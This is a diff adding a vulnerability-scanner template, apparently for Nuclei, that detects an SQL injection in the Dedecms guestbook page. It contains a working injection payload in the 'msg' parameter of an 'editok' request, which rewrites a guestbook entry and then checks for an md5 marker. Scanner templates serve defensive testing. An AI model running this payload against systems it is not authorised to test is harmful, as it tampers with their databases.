@@ -1,0 +1,52 @@
+id: dedecms-guestbook-sqli
+
+info:
+  name: Dedecms Guestbook SQL Injection Vulnerability
+  author: ProjectDiscoveryAI
+  severity: medium
+  tags: sql-injection, dedecms
+  description: |
+    Dedecms Guestbook is vulnerable to SQL injection, allowing attackers to execute arbitrary SQL commands.
+
+variables:
+  r: "{{rand_int(10000, 21000)}}"
+
+http:
+  - id: initial-request
+    method: GET
+    path:
+      - "{{BaseURL}}/plus/guestbook.php"
+    matchers:
+      - type: regex
+        regex:
+          - "action=admin&id=(\\d{1,20})"
+    extractors:
+      - type: regex
+        name: articleid
+        internal: true
+        part: body
+        regex:
+          - "action=admin&id=(\\d{1,20})"
+
+  - id: sqli-exploit
+    method: GET
+    path:
+      - "{{BaseURL}}/plus/guestbook.php?action=admin&job=editok&id={{articleid}}&msg=',msg=@`'`,msg=(select md5({{r}})),email='"
+    matchers:
+      - type: status
+        status:
+          - 200
+
+  - id: verify-sqli
+    method: GET
+    path:
+      - "{{BaseURL}}/plus/guestbook.php"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "{{md5(r)}}"
+        part: body
